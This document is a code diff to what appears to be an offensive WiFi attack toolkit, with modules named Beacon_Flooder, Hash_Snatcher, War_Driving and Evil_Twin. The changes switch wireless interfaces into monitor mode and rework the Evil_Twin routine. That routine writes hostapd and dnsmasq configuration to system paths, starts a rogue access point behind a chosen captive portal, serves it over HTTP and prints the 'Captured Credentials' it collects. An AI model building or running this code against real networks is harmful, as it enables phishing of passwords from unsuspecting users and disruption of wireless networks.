@@ -947,6 +947,9 @@ class Frame_Snatcher():
 
             # PRINT WELCOME UI
             Frame_Snatcher.welcome_ui(skip=skip, iface=cls.iface)
+            
+            
+            Background_Threads.change_iface_mode(iface=cls.iface, mode="monitor")
 
 
             # START AUTO HOPPER // FOR NOW
@@ -1299,6 +1302,8 @@ class Beacon_Flooder():
 
             # OUTPUT UI
             Frame_Snatcher.welcome_ui(iface=cls.iface, text="    WiFi \nSpoofing", skip=True)
+            Background_Threads.change_iface_mode(iface=cls.iface, mode="monitor")
+
 
 
             # SET CHANNEL
@@ -1696,6 +1701,8 @@ class Hash_Snatcher():
 
             # WELCOME
             Frame_Snatcher.welcome_ui(iface=cls.iface)
+            Background_Threads.change_iface_mode(iface=cls.iface, mode="monitor")
+
 
 
             # START CHANNEL HOPPER
@@ -2228,6 +2235,8 @@ class War_Driving():
 
             # WELCOME UI
             Frame_Snatcher.welcome_ui(iface=iface, text="    War \nDriving", c2="bold blue")
+            Background_Threads.change_iface_mode(iface=cls.iface, mode="monitor")
+
 
 
             # INIT WAR
@@ -2258,7 +2267,6 @@ class War_Driving():
 
         except Exception as e:
             console.print(f"[bold red]Exception Error:[bold yellow] {e}")
-
 
 
 class Evil_Twin():
@@ -2302,7 +2310,7 @@ class Evil_Twin():
                 choice = console.input("\n[bold yellow]Choose portal!: "); choice = int(choice)
     
                 
-                if 1 <= choice <= max: portal=f"portal_{choice}"; return portal, portals[choice]  
+                if 1 <= choice <= max: portal=f"portal_{choice}"; console.print(f"[bold green][+] Evil Twinning --> {portals[choice]}"); return portal, portals[choice]  
 
             
             except (KeyError, TypeError) as e: console.print(f"[bold red][-]Error:[bold yellow] {e}")
@@ -2369,6 +2377,7 @@ class Evil_Twin():
 
             data_hostapd = dedent(
                 f"""
+                interface={iface}
                 driver=nl80211
                 ssid={ssid}
                 hw_mode=g
@@ -2379,7 +2388,6 @@ class Evil_Twin():
                 """
             ).strip(); what = "hostapd_config"
 
-            path = str(path / "hostapd.conf")
 
             with open(path, "w") as file: file.write(data_hostapd)
             if verbose: console.print(f"[bold green][+] Successfully created:[bold yellow] {what} - {path}")
@@ -2397,12 +2405,6 @@ class Evil_Twin():
 
 
         try:
-
-            subprocess.run(["mkdir", "-p", "/etc/dnsmasq.d"], check=True)
-            subprocess.run(["mkdir", "-p", "/var/lib/misc"], check=True)
-            subprocess.run(["mkdir", "-p", "/var/log"], check=True)
-
-
 
             data_dnsmasq = dedent(
             f"""
@@ -2430,7 +2432,7 @@ class Evil_Twin():
             dhcp-leasefile={dnsmasq_leases}
                 """).strip(); what = "dnsmasq.conf"
 
-            path = str(path / "dnsmasq.conf")
+
             with open(path, "w") as file: file.write(data_dnsmasq)
             if verbose: console.print(f"[bold green][+] Successfully created:[bold yellow] {what} - {path}")
             return path
@@ -2597,9 +2599,16 @@ class Evil_Twin():
     def main(cls):
         """This will control class wide logic"""
 
-        
+        # PATHS
+        hostapd_conf = "/etc/hostapd/evil_twin.conf"
+        dnsmasq_conf = "/etc/dnsmasq.d/evil_twin.conf"
+        dnsmasq_log = "/var/log/dnsmasq_evil.log"
+        dnsmasq_leases = "/var/lib/misc/dnsmasq.leases"
+        paths = [hostapd_conf, dnsmasq_conf, dnsmasq_log, dnsmasq_leases]
+            
         cls.creds = []
         
+
         try:
 
             iface = Frame_Snatcher.get_interface()
@@ -2607,25 +2616,33 @@ class Evil_Twin():
             Background_Threads.change_iface_mode(iface=iface, mode="managed")
             Background_Threads.channel_hopper(set_channel=6)
 
-            Evil_Twin._kill_processes()
-            Evil_Twin._configure_interface()
-
             portal, ssid = Evil_Twin._choose_portal()
             conf_path, path = Evil_Twin._get_portal_path(portal=portal); print('\n')
 
-            path_hostapd = Evil_Twin._create_hostapd_conf(path=conf_path, iface=iface, ssid=ssid);     Evil_Twin._start_hostapd(path=path_hostapd)
-            path_dnsmasq = Evil_Twin._create_dnsmasq_conf(path=conf_path, iface=iface); time.sleep(2); Evil_Twin._start_dnsmasq(path=path_dnsmasq)
+            Evil_Twin._kill_processes()
+            Evil_Twin._configure_interface(iface=iface)
+
+            subprocess.run(["mkdir", "-p", "/etc/dnsmasq.d"], check=True)
+            subprocess.run(["mkdir", "-p", "/var/lib/misc"], check=True)
+            subprocess.run(["mkdir", "-p", "/var/log"], check=True)
+            subprocess.run(["mkdir", "-p", "/etc/hostapd"], check=True)
+
+
+
+            path_hostapd = Evil_Twin._create_hostapd_conf(path=hostapd_conf, iface=iface, ssid=ssid);     Evil_Twin._start_hostapd(path=path_hostapd)
+            path_dnsmasq = Evil_Twin._create_dnsmasq_conf(path=dnsmasq_conf, dnsmasq_log=dnsmasq_log, dnsmasq_leases=dnsmasq_leases, iface=iface); time.sleep(2); Evil_Twin._start_dnsmasq(path=path_dnsmasq)
 
             Evil_Twin._Evil_Server._Start_HTTP_Server(path=path)
         
 
-        except KeyboardInterrupt: 
-            Evil_Twin._terminate_instance(iface=iface)
-            console.input("[bold red]\n\nPress enter to exit: ")
+        except KeyboardInterrupt: pass
+        except Exception as e: console.print(f"[bold red]Exception Error:[bold yellow] {e}")
         
-        except Exception as e: 
+
+        finally:
             Evil_Twin._terminate_instance(iface=iface)
-            console.print(f"[bold red]Exception Error:[bold yellow] {e}")
+            console.print(f"[bold green][+] Captured Credentials:[bold yellow] {cls.creds}")
+            console.input("[bold red]\n\nPress enter to exit: ")
 
 
         """
